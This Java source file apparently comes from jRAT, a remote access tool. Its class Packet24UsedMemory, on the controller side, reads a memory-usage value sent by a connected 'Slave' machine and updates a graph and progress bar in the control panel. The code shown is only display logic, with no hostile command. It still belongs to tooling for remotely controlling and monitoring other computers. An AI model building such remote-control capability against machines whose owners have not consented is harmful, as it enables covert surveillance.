package io.jrat.controller.packets.incoming;

import io.jrat.common.utils.MathUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelMemoryUsage;

import java.io.DataInputStream;


public class Packet24UsedMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		long used = dis.readLong();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelMemoryUsage panel = (PanelMemoryUsage) frame.panels.get("memory usage");

			if (panel != null) {
				panel.getGraph().addValues(used, slave.getMemory());

				if (frame.getTabbedPane().getTitleAt(1).equals("memory usage") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.getGraph().repaint();
				}
				panel.getProgressBar().setValue(MathUtils.getPercentFromTotal(used, slave.getMemory()));
			}
		}

	}

}
